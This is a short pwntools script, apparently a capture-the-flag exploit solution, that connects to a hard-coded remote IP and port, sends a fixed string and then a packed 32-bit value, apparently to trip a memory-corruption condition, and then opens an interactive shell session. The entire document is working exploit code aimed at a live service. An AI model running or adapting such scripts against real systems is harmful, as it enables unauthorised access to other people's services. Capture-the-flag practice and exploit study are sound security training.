from pwn import *
context.log_level = 'DEBUG'
i=remote('103.69.97.144',5061)
print(i.recv())
i.sendline(b'DCBA')
print(i.recv())
i.send(p32(0x13141516, endian='little'))
print(i.recv())
i.interactive()
